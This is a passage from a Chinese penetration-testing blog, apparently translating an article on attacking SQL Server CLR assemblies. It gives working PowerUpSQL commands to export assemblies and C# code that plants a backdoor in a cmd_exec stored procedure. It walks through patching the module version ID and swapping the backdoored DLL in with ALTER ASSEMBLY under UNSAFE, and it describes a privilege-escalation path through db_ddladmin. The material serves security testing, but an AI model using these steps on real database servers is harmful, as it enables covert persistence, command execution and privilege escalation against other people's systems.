<h2 id="存储过程参数映射"><a href="#存储过程参数映射" class="headerlink" title="存储过程参数映射"></a>存储过程参数映射</h2><p>攻击者不是唯一创建不安全assemblies的人群。有些情况下，开发人员也会去创建一些能够和操作系统资源交互的assembly或者能够直接执行操作系统命令的assembly。所以，以assembly为目标是可能导致提权的。举个例子来说，如果我们这边是存在不安全的assembly，我们可以尝试定义这些assembly能够接受的参数以及如何使用他们。这里出于乐趣，我们使用下面的这条查询去随意确定cmd_exec存储过程所能接受的参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">SELECT			pr.name as procname,</div><div class="line">                        pa.name as param_name, </div><div class="line">                        TYPE_NAME(system_type_id) as Type,</div><div class="line">                        pa.max_length, </div><div class="line">                        pa.has_default_value,</div><div class="line">                        pa.is_nullable </div><div class="line">FROM 			sys.all_parameters pa</div><div class="line">INNER JOIN 		sys.procedures pr on pa.object_id = pr.object_id</div><div class="line">WHERE 			pr.type like &apos;pc&apos; and pr.name like &apos;cmd_exec&apos;</div></pre></td></tr></table></figure>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/4.png" alt="4"></p>
<p>在这个例子中，我们可以看到它只接受了名为”execCommand”的字符串参数。以存储过程为目标的攻击者或许能够判断出这可以用于命令执行。</p>
<h2 id="如何将SQL-Server中的CLR-Assembly导出成DLL。"><a href="#如何将SQL-Server中的CLR-Assembly导出成DLL。" class="headerlink" title="如何将SQL Server中的CLR Assembly导出成DLL。"></a>如何将SQL Server中的CLR Assembly导出成DLL。</h2><p>对已存在的CRL assembly存储过程的功能进行简单的测试不是我们找到升级路径的唯一选项。在SQL Server中，我们可以将用户定义的CLR assemblies导出为DLLS。我们来聊聊CLR识别到CLR源码。开始的第一步是对assemblies进行识别，然后将它们导出为DLLs文件，接下来再是反编译，这样一来我们就可以进行分析其中的问题（也可能被修改插入了后门）。</p>
<h4 id="利用PowerUpSQL自动化-2"><a href="#利用PowerUpSQL自动化-2" class="headerlink" title="利用PowerUpSQL自动化"></a>利用PowerUpSQL自动化</h4><p>上一节内容中，我们提到了如何使用PowerUpSQL命令列出CLR assembly，命令如下。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
<p>上面的Get-SQLStoredProcedureCLR函数还支持”ExportFolder”选项，如果你设置了该参数，它就会将assemblies导出到指定的文件夹中。下面是一个示例和输出。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -ExportFolder c:\temp  -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/6.png" alt="6"></p>
<p>完成后，你也可以批量的导出CLR DLLS文件（前提是你得是域用户和sysadmin用户），然后使用下面这条命令就能达到效果。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLInstanceDomain -Verbose | Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> -ExportFolder c:\temp | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
<p>你可以在输出文件夹中找到DLLs，该脚本会以每台服务器的名字、实例以及数据库名字动态构建文件夹结构。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/7.png" alt=""></p>
<p>接下来只需要通过你最爱的反编译器就能看到源代码了。在过去一整年里，我成为了dnsSpy的忠实粉丝，至于原因嘛，在你阅读完下一部分就知道了。</p>
<h2 id="我是如何对CLR-DLL进行修改，同时还将已导入SQL-Server的Assembly进行覆写的？"><a href="#我是如何对CLR-DLL进行修改，同时还将已导入SQL-Server的Assembly进行覆写的？" class="headerlink" title="我是如何对CLR DLL进行修改，同时还将已导入SQL Server的Assembly进行覆写的？"></a>我是如何对CLR DLL进行修改，同时还将已导入SQL Server的Assembly进行覆写的？</h2><p>下面这张图是一张轮廓图，主要展示了通过dnSpy如何反编译、观察、编辑、保存以及再导入已存在SQL Server中的CLR DLL文件。你可以在这下载到<a href="https://github.com/0xd4d/dnSpy/releases" target="_blank" rel="external">dnSpy</a>.</p>
<p>这里我们就以早些时候从SQL Server导出的cmd_exec.dll为例，对其进行修改。</p>
<p>第一步，用dnSpy打开cmd_exec.dll文件。左侧栏，往下拉直到你找到cmd_exec方法，选中它。接着你就能看到了源代码，现在可以开始寻找漏洞了。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/8.png" alt="8"></p>
<p>第二步，在右边包含源码的界面右击然后选择“Edit Method(C#)”。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/9.png" alt="9"></p>
<p>第三步，编辑你希望的代码。但是，在这个例子中我添加了一个后门，该后门的作用是每调用一次cmd_exec，它就会在”C:\temp\”目录下增加一个文件。示例代码和截图如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[SqlProcedure]</div><div class="line">public static void cmd_exec(SqlString execCommand)</div><div class="line">&#123;</div><div class="line">    Process expr_05 = new Process();</div><div class="line">    expr_05.StartInfo.FileName = &quot;C:\\Windows\\System32\\cmd.exe&quot;;</div><div class="line">    expr_05.StartInfo.Arguments = string.Format(&quot; /C &#123;0&#125;&quot;, execCommand.Value);</div><div class="line">    expr_05.StartInfo.UseShellExecute = true;</div><div class="line">    expr_05.Start();</div><div class="line">    expr_05.WaitForExit();</div><div class="line">    expr_05.Close();</div><div class="line">    Process expr_54 = new Process();</div><div class="line">    expr_54.StartInfo.FileName = &quot;C:\\Windows\\System32\\cmd.exe&quot;;</div><div class="line">    expr_54.StartInfo.Arguments = string.Format(&quot; /C &apos;whoami &gt; c:\\temp\\clr_backdoor.txt&quot;, execCommand.Value);</div><div class="line">    expr_54.StartInfo.UseShellExecute = true;</div><div class="line">    expr_54.Start();</div><div class="line">    expr_54.WaitForExit();</div><div class="line">    expr_54.Close();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/10.png" alt="10"></p>
<p>第四步，通过点击完成保存修补后的代码。接着点击顶部菜单栏的选择文件，保存模块，保存它。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/11.png" alt="11"></p>
<p>根据<a href="https://msdn.microsoft.com/en-us/library/system.reflection.module.moduleversionid.aspx" target="_blank" rel="external">微软的资料</a>来看，每次CLR编译，都有一个唯一的GUID生成并会内嵌在编译后的文件头上。所以，识别统一文件的不同版本是可行的。这个ID也可以叫做MVID（模块版本ID）。为了覆写已存在SQL Server中的CLR，我们一定得手动改掉MVID。下面是整个过程的概览。</p>
<p>第一步，如果没打开cmd_exec，请在dnSpy中打开。接着将可见界面拖到PE部分，选择”#GUID”存储流，接着右键并选择以十六进制格式显示数据。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/12.png" alt="12"></p>
<p>第二步，你一定得去修改这些被选中的字节，可以修改成任意值。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/13.png" alt="13"></p>
<p>第三步，从顶部菜单选择文件然后保存模块。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/14.png" alt="14"></p>
<h4 id="利用PowerShell自动化"><a href="#利用PowerShell自动化" class="headerlink" title="利用PowerShell自动化"></a>利用PowerShell自动化</h4><p>你可以使用我之前提供给你的原生PowerShell命令或者是使用下面示例的PowerUPSQL命令去获取来自新改动的cmd_exec.dll文件的十六进制字节，接着生成ALTER语句。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PS C:\temp&gt; Create-SQLFileCLRDll -Verbose -SourceDllPath .\cmd_exec.dll</div><div class="line">VERBOSE: Target C<span class="comment">#  File: NA</span></div><div class="line">VERBOSE: Target DLL File: .\cmd_exec.dll</div><div class="line">VERBOSE: Grabbing bytes from the dll</div><div class="line">VERBOSE: Writing SQL to: C:\Users\SSUTHE~<span class="number">1</span>\AppData\Local\Temp\CLRFile.txt</div><div class="line">C<span class="comment"># File: NA</span></div><div class="line">CLR DLL: .\cmd_exec.dll</div><div class="line">SQL Cmd: C:\Users\SSUTHE~<span class="number">1</span>\AppData\Local\Temp\CLRFile.txt</div></pre></td></tr></table></figure>
<p>新的cmd_exec.txt文件看起来是应该是这样的。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-- Choose the msdb database</div><div class="line">use msdb</div><div class="line">-- Alter the existing CLR assembly</div><div class="line">ALTER ASSEMBLY [my_assembly] FROM </div><div class="line"><span class="number">0</span>x4D5A90000300000004000000F[TRUNCATED]</div><div class="line">WITH PERMISSION_SET = UNSAFE </div><div class="line">GO</div></pre></td></tr></table></figure>
<p>Alter语句通常用于存在的CLR而不是DROP和CREATE。就像微软谈到的，”ALTER ASSEMBLY 不会中断在不停变化的assembly中运行的代码的会话。”所以，一句话概括就是不会出现异常。TSQL查询如下图所示。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/15.png" alt="15"></p>
<p>为了检验你的代码修改是否生效，请运行cmd_exec存储过程然后检测是否生成了”C:\temp\backdoor.txt”</p>
<h2 id="我能否通过定制化的CLR进行SQL-Server提权吗？"><a href="#我能否通过定制化的CLR进行SQL-Server提权吗？" class="headerlink" title="我能否通过定制化的CLR进行SQL Server提权吗？"></a>我能否通过定制化的CLR进行SQL Server提权吗？</h2><p>当然能了，但最开始可能会遇到一些不太令人喜欢的情况。</p>
<p>如果你不是以sysadmin登录SQL Server，但你又有CREATE和ALter ASSEMBLY权限，也许你能够在SQL Server服务账号（默认是sysadmin）下使用可以执行操作系统命令的CLR去获得sysadmin权限。然而，为了让你成功，你创建的CLR assembly所在的数据库必须设置了is_trustworthy标志为1，同时还得启用了clr enabled（也就是说不能禁用clr）。默认情况下，只有msdb数据库是可信的，并且clr enabled设置是被禁用的。</p>
<p>我从未见过CREATE或ALTER ASSEMBLY权限明确分配给能够登录的用户。然而，我却见过应用程序的SQL登录被添加到”db_ddladmin”数据角色，并且这个角色的的确确拥有”ALTER ASSEMBLY”权限。</p>
<p>注意，SQL Server 2017引进了clr strict security配置。微软文档讲述了该配置应被禁止防止UNSAFE或EXTERNAL assembly被创建。</p>
<h2 id="告警"><a href="#告警" class="headerlink" title="告警"></a>告警</h2><p>本文中，我仅展示了一部分可能被滥用的CLR assemblies同时有些任务（比如导出CLR assemblies）可以通过PowerUPSQL来批量完成。值得注意的是文中的所有技术都可以被记录和用语警告（通过原生SQL Server功能），但是我期待有另外一天重提这些。除此之外，请愉快的玩耍和带有责任的hack吧。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow(v=vs.110).aspx</a></li>
<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/system.reflection.module.moduleversionid.aspx</a></li>
<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ff878250.aspx</a></li>
<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://docs.microsoft.com/en-us/sql/t-sql/statements/create-assembly-transact-sql</a></li>
<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://docs.microsoft.com/en-us/sql/t-sql/statements/alter-assembly-transact-sql</a></li>
<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/</a></li>
</ul>
<h2 id="译者参考资料"><a href="#译者参考资料" class="headerlink" title="译者参考资料"></a>译者参考资料</h2><p>1.<a href="http://blog.csdn.net/luckystar689/article/details/42559607" target="_blank" rel="external">NET 基础——CLR、BCL、DLL、Assembly</a><br>2.<a href="http://www.cnblogs.com/raker/p/4377343.html" target="_blank" rel="external">MySQL UDF（自定义函数)</a></p>
<p>##<a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="external">原文</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="/talk-about-ssh-tunnel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ꭰ">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/talk-about-ssh-tunnel/" itemprop="url">聊聊ssh的端口转发（NAT穿透）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-04T20:51:44+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index">
                    <span itemprop="name">Penetration Test</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>ssh端口转发和ssh隧道不是同一概念。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/talk-about-ssh-tunnel/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Ꭰ</p>
              <p class="site-description motion-element" itemprop="description">Me. a lazy person</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://jkme.github.io" title="jkme" target="_blank">jkme</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ꭰ</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
